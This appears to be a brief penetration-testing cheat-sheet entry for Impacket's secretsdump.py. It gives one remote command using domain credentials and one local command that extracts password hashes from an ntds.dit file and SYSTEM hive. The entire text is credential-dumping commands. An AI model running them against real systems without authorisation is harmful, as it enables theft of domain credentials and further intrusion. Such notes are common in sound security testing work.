Dumps local SAM & cached domain user credentials

Over internet: 
secretsdump.py <domain>/<username>:<password>@<ip>

Locally:
python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL